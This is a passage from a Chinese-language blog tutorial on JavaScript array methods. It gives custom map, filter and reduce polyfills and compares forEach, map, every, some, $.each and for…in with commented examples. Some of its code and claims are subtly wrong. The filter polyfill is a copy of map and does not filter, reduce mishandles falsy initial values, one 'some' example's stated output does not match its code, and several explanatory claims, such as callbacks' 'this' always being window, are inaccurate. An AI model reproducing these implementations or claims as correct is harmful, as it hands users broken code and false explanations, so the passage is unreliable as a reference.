js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">arr.map(<span class="function"><span class="keyword">function</span>(<span class="params">item, index, self</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(item, index, self);</span><br><span class="line">&#125;, thisArg); <span class="comment">// 参数2可选，表示执行 callback 函数时使用的this 值</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 参数是一个回调函数，返回值是一个Array，不需要关心内部处理</span></span><br><span class="line"><span class="built_in">Array</span>.prototype.newMap = <span class="function"><span class="keyword">function</span>(<span class="params">fn, context</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// this指向的就是调用者arr</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> fn !== <span class="string">"function"</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">`<span class="subst">$&#123;fn&#125;</span> is not a function`</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  context = <span class="built_in">Object</span>(context) || global; <span class="comment">// 严格模式下，context 为 null 或 undefined 时 Object(context) 返回空对象，不会被赋值为global</span></span><br><span class="line">  <span class="keyword">var</span> newArr = [];</span><br><span class="line">　<span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.length; i++) &#123;</span><br><span class="line">　　newArr.push(fn.call(context, <span class="keyword">this</span>[i], i, <span class="keyword">this</span>));</span><br><span class="line">　&#125;</span><br><span class="line">  <span class="keyword">return</span> newArr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="js实现filter方法-同map"><a href="#js实现filter方法-同map" class="headerlink" title="js实现filter方法(同map)"></a>js实现filter方法(同map)</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">arr.filter(<span class="function"><span class="keyword">function</span>(<span class="params">item, index, self</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(item, index, self);</span><br><span class="line">&#125;, thisArg);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 参数是一个回调函数，返回值是一个Array，不需要关心内部处理</span></span><br><span class="line"><span class="built_in">Array</span>.prototype.newFilter = <span class="function"><span class="keyword">function</span>(<span class="params">fn, context</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// this指向的就是调用者arr</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> fn !== <span class="string">"function"</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">`<span class="subst">$&#123;fn&#125;</span> is not a function`</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  context = <span class="built_in">Object</span>(context) || global; <span class="comment">// 严格模式下，context 为 null 或 undefined 时 Object(context) 返回空对象，不会被赋值为global</span></span><br><span class="line">  <span class="keyword">var</span> newArr = [];</span><br><span class="line">　<span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.length; i++) &#123;</span><br><span class="line">　　newArr.push(fn.call(context, <span class="keyword">this</span>[i], i, <span class="keyword">this</span>));</span><br><span class="line">　&#125;</span><br><span class="line">  <span class="keyword">return</span> newArr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="js实现reduce方法"><a href="#js实现reduce方法" class="headerlink" title="js实现reduce方法"></a>js实现reduce方法</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">arr.reduce(<span class="function"><span class="keyword">function</span>(<span class="params">prev, cur, index, arr</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(prev, cur, index, arr);</span><br><span class="line">&#125;[, initialValue]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">Array</span>.prototype.newReduce = <span class="function"><span class="keyword">function</span> (<span class="params">fn, initialValue</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// this指向的就是调用者arr</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> fn !== <span class="string">"function"</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">`<span class="subst">$&#123;fn&#125;</span> is not a function`</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> account = initialValue || <span class="keyword">this</span>[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">const</span> startIndex = initialValue ? <span class="number">0</span> : <span class="number">1</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = startIndex; i &lt; <span class="keyword">this</span>.length; i++) &#123;</span><br><span class="line">    account = fn(account, <span class="keyword">this</span>[i], i, <span class="keyword">this</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> account;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="forEach-和-map的区别"><a href="#forEach-和-map的区别" class="headerlink" title="forEach 和 map的区别"></a>forEach 和 map的区别</h2><p>相同点：</p><ul><li>都是循环遍历数组中的每一项</li><li>每次执行匿名函数都支持三个参数，参数分别为item（当前每一项），index（索引值），arr（原数组）</li><li>匿名函数中的 <code>this</code> 都是指向 <code>window</code></li><li>只能遍历数组</li><li>都没有break跳出循环，当想跳出循环可以使用every 和 some方法，参照下例 </li></ul><p>不同点</p><ul><li>map方法返回一个新的数组，数组中的元素为原始数组调用函数处理后的值，map方法不会改变原始数组</li><li>map方法不会对空数组进行检测</li><li>foreach方法没有返回一个新数组&amp;没有返回值，即处理的是数组本身</li><li>foreach方法会对空数组进行检测</li></ul><hr><h2 id="map、forEach、every、some、-each、for-in、es6-for-of等用法"><a href="#map、forEach、every、some、-each、for-in、es6-for-of等用法" class="headerlink" title="map、forEach、every、some、$.each、for in、es6 for of等用法"></a>map、forEach、every、some、$.each、for in、es6 for of等用法</h2><h3 id="map"><a href="#map" class="headerlink" title="map"></a>map</h3>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> arr = [</span><br><span class="line">  &#123;</span><br><span class="line">    id: <span class="number">1</span>,</span><br><span class="line">    num: <span class="number">10</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    id: <span class="number">2</span>,</span><br><span class="line">    num: <span class="number">20</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    id: <span class="number">3</span>,</span><br><span class="line">    num: <span class="number">30</span>,</span><br><span class="line">  &#125;</span><br><span class="line">];</span><br><span class="line"><span class="comment">// map()方法返回一个新数组，数组中的元素为原始数组元素调用函数处理后的值。</span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="comment">// 注意事项：</span></span><br><span class="line"><span class="comment">// 1、map方法内容应该有一个return语句</span></span><br><span class="line"><span class="comment">// 2、原数组不会被修改</span></span><br><span class="line"><span class="comment">// 3、不会进行空数组检测</span></span><br><span class="line"><span class="comment">// 4、那些已删除或者未初始化的项将被跳过（例如在稀疏数组上，稀疏数组如 new Array(10)）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 场景1：收集所有的id</span></span><br><span class="line"><span class="keyword">const</span> arr1 = arr.map(<span class="function">(<span class="params">item, index, self</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// return item.id; // 收集value值 [1, 2, 3]</span></span><br><span class="line">  <span class="keyword">return</span> &#123;<span class="attr">id</span>: item.id&#125;; <span class="comment">// 收集键值对 [&#123;id: 1&#125;, &#123;id: 2&#125;, &#123;id: 3&#125;]</span></span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(arr1);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 场景2：将arr每一项中的num乘以2，并且新增一个name字段</span></span><br><span class="line"><span class="keyword">const</span> arr2 = arr.map(<span class="function">(<span class="params">item, index, self</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> item.num * <span class="number">2</span>;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(arr2); <span class="comment">// [20, 40, 60]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 场景3：往arr每一项中新增一个name字段，并赋初始值 小明</span></span><br><span class="line"><span class="keyword">const</span> arr3 = arr.map(<span class="function">(<span class="params">item, index, self</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> $.extend(item, &#123;</span><br><span class="line">    name: <span class="string">'小明'</span></span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(arr3); <span class="comment">// [&#123;id:1, num:10, name:'小明'&#125;, ...]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 场景4，一步操作，同时满足2和3</span></span><br><span class="line"><span class="keyword">const</span> arr4 = arr.map(<span class="function">(<span class="params">item, index, self</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> $.extend(item, &#123;</span><br><span class="line">    num: item.num * <span class="number">2</span>,</span><br><span class="line">    name: <span class="string">'小明'</span></span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(arr4); <span class="comment">// [&#123;id:1, num:20, name:'小明'&#125;, ...]</span></span><br></pre></td></tr></table></figure><h3 id="forEach"><a href="#forEach" class="headerlink" title="forEach"></a>forEach</h3>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [</span><br><span class="line">  &#123;</span><br><span class="line">    id: <span class="number">1</span>,</span><br><span class="line">    num: <span class="number">10</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    id: <span class="number">2</span>,</span><br><span class="line">    num: <span class="number">20</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    id: <span class="number">3</span>,</span><br><span class="line">    num: <span class="number">30</span>,</span><br><span class="line">  &#125;</span><br><span class="line">];</span><br><span class="line"><span class="comment">// forEach()方法用于调用数组的每个元素，并将元素传递给回调函数。</span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="comment">// 注意事项：</span></span><br><span class="line"><span class="comment">// 1、原数组会被修改</span></span><br><span class="line"><span class="comment">// 2、会进行空数组检测</span></span><br><span class="line"><span class="comment">// 3、那些已删除或者未初始化的项将被跳过（例如在稀疏数组上，稀疏数组如 new Array(10)）</span></span><br><span class="line"><span class="comment">// 4、如果数组在迭代时被修改了，则其他元素会被跳过。如果迭代时删除第二项，则原本的第三项会补到第二项，此时第三项会被跳过</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 场景1：收集所有的id</span></span><br><span class="line"><span class="keyword">let</span> newArr = [];</span><br><span class="line"><span class="keyword">const</span> arr1 = arr.forEach(<span class="function">(<span class="params">item, index, self</span>) =&gt;</span> &#123;</span><br><span class="line">  newArr.push(item.id); <span class="comment">// 收集value值 [1, 2, 3]</span></span><br><span class="line">  newArr.push(&#123;<span class="attr">id</span>: item.id&#125;); <span class="comment">// 手机键值对 [&#123;id: 1&#125;, &#123;id: 2&#125;, &#123;id: 3&#125;]</span></span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(newArr);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 场景2：将arr每一项中的num乘以2，并且新增一个name字段</span></span><br><span class="line">arr.forEach(<span class="function">(<span class="params">item, index, self</span>) =&gt;</span> &#123;</span><br><span class="line">  item.num = item.num * <span class="number">2</span>;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(arr); <span class="comment">// [&#123;id:1, num:20&#125;, ...]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 场景3：往arr每一项中新增一个name字段，并赋初始值 小明</span></span><br><span class="line">arr.forEach(<span class="function">(<span class="params">item, index, self</span>) =&gt;</span> &#123;</span><br><span class="line">  item = $.extend(item, &#123;</span><br><span class="line">    name: <span class="string">'小明'</span></span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(arr3); <span class="comment">// [&#123;id:1, num:10, name:'小明'&#125;, ...]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 场景4，一步操作，同时满足2和3</span></span><br><span class="line">arr.forEach(<span class="function">(<span class="params">item, index, self</span>) =&gt;</span> &#123;</span><br><span class="line">  item = $.extend(item, &#123;</span><br><span class="line">    num: item.num * <span class="number">2</span>,</span><br><span class="line">    name: <span class="string">'小明'</span></span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(arr4); <span class="comment">// [&#123;id:1, num:20, name:'小明'&#125;, ...]</span></span><br></pre></td></tr></table></figure><h3 id="every"><a href="#every" class="headerlink" title="every"></a>every</h3>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [</span><br><span class="line">  &#123;</span><br><span class="line">    id: <span class="number">1</span>,</span><br><span class="line">    num: <span class="number">10</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    id: <span class="number">2</span>,</span><br><span class="line">    num: <span class="number">20</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    id: <span class="number">3</span>,</span><br><span class="line">    num: <span class="number">30</span>,</span><br><span class="line">  &#125;</span><br><span class="line">];</span><br><span class="line"><span class="comment">// every()方法用于检测数组所有元素是否都符合指定条件</span></span><br><span class="line"><span class="comment">// 如果数组中检测到有一个元素不满足，则整个表达式返回 false ，且剩余的元素不会再进行检测。</span></span><br><span class="line"><span class="comment">// 如果所有元素都满足条件，则返回 true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 场景1：检测arr中是否所有的项的num都为10</span></span><br><span class="line">arr.every(<span class="function">(<span class="params">item, index, self</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> item.num === <span class="number">10</span>;</span><br><span class="line">&#125;); <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 场景2：使用return false 来跳出循环</span></span><br><span class="line">arr.every(<span class="function">(<span class="params">item, index, self</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (item.num &gt; <span class="number">10</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// 跳出循环</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(item.num)<span class="comment">// 10</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="some"><a href="#some" class="headerlink" title="some"></a>some</h3>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [</span><br><span class="line">  &#123;</span><br><span class="line">    id: <span class="number">1</span>,</span><br><span class="line">    num: <span class="number">10</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    id: <span class="number">2</span>,</span><br><span class="line">    num: <span class="number">20</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    id: <span class="number">3</span>,</span><br><span class="line">    num: <span class="number">30</span>,</span><br><span class="line">  &#125;</span><br><span class="line">];</span><br><span class="line"><span class="comment">// some()方法方法用于检测数组中的元素是否满足指定条件</span></span><br><span class="line"><span class="comment">// 如果有一个元素满足条件，则表达式返回true , 剩余的元素不会再执行检测。</span></span><br><span class="line"><span class="comment">// 如果没有满足条件的元素，则返回false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 场景1：检测arr中是否所有的项的num都为10</span></span><br><span class="line">arr.some(<span class="function">(<span class="params">item, index, self</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> item.num === <span class="number">10</span>;</span><br><span class="line">&#125;); <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 场景2：使用return true 来跳出循环</span></span><br><span class="line">arr.some(<span class="function">(<span class="params">item, index, self</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (item.num &gt; <span class="number">20</span>) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(item.num); <span class="comment">// 10、20</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">// 跳出循环</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="each"><a href="#each" class="headerlink" title="$.each"></a>$.each</h3><p>  $.each()是对数组，json和dom结构等的遍历</p><ol><li><p>遍历list</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">100</span>, <span class="number">200</span>, <span class="number">300</span>];</span><br><span class="line">$.each(arr, (index, item) =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(index, item);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 0 100</span></span><br><span class="line"><span class="comment">// 1 200</span></span><br><span class="line"><span class="comment">// 2 300</span></span><br></pre></td></tr></table></figure></li><li><p>遍历map</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  a: <span class="number">100</span>,</span><br><span class="line">  b: <span class="number">200</span>,</span><br><span class="line">  c: <span class="number">300</span></span><br><span class="line">&#125;;</span><br><span class="line">$.each(obj, (key, value) =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(key, value)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// a 100</span></span><br><span class="line"><span class="comment">// b 200</span></span><br><span class="line"><span class="comment">// c 300</span></span><br></pre></td></tr></table></figure></li><li><p>遍历list map</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> listMap = [</span><br><span class="line">  &#123;</span><br><span class="line">    id: <span class="number">1</span>,</span><br><span class="line">    name: <span class="string">'小明'</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    id: <span class="number">2</span>,</span><br><span class="line">    name: <span class="string">'小红'</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    id: <span class="number">3</span>,</span><br><span class="line">    name: <span class="string">'小白'</span></span><br><span class="line">  &#125;</span><br><span class="line">];</span><br><span class="line">$.each(listMap, (index, item) =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'outer each:'</span>, index, item);</span><br><span class="line">  $.each(item, (key, value) =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'inner each:'</span>, key, value);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// outer each: 0 &#123;id: 1, name: "小明"&#125;</span></span><br><span class="line"><span class="comment">// inner each: id 1</span></span><br><span class="line"><span class="comment">// inner each: name 小明</span></span><br><span class="line"><span class="comment">// outer each: 1 &#123;id: 2, name: "小红"&#125;</span></span><br><span class="line"><span class="comment">// inner each: id 2</span></span><br><span class="line"><span class="comment">// inner each: name 小红</span></span><br><span class="line"><span class="comment">// outer each: 2 &#123;id: 3, name: "小白"&#125;</span></span><br><span class="line"><span class="comment">// inner each: id 3</span></span><br><span class="line"><span class="comment">// inner each: name 小白</span></span><br></pre></td></tr></table></figure></li><li><p>遍历dom</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"aaa"</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">value</span>=<span class="string">"111"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"bbb"</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">value</span>=<span class="string">"222"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"ccc"</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">value</span>=<span class="string">"333"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"ddd"</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">value</span>=<span class="string">"444"</span>/&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$.each($(<span class="string">"[type='hidden']"</span>), (index, element) =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(index, element.item, element.value);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 0 aaa 111</span></span><br><span class="line"><span class="comment">// 1 bbb 222</span></span><br><span class="line"><span class="comment">// 2 ccc 333</span></span><br><span class="line"><span class="comment">// 3 ddd 444</span></span><br></pre></td></tr></table></figure></li><li><p>jquery dom 遍历 </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(selector).each(<span class="function"><span class="keyword">function</span> (<span class="params">index, element</span>) </span>&#123;&#125;);</span><br></pre></td></tr></table></figure><p>这种写法常在遍历 <code>Dom</code> 的时候出现。</p></li></ol><h3 id="for…in"><a href="#for…in" class="headerlink" title="for…in"></a>for…in</h3><p>  for…in 语句用于遍历数组或者对象的属性（对数组或者对象的属性进行循环操作）<br>  for…in 语句取到的是list、string的索引 或 map的key</p><ol><li><p>遍历list</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> list = [<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">50</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i <span class="keyword">in</span> list) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(i, list[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 0 10</span></span><br><span class="line"><span class="comment">// 1 20</span></span><br><span class="line"><span class="comment">// 2 30</span></span><br><span class="line"><span class="comment">// 3 40</span></span><br><span class="line"><span class="comment">// 4 50</span></span><br></pre></td></tr></table></figure></li><li><p>遍历string</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 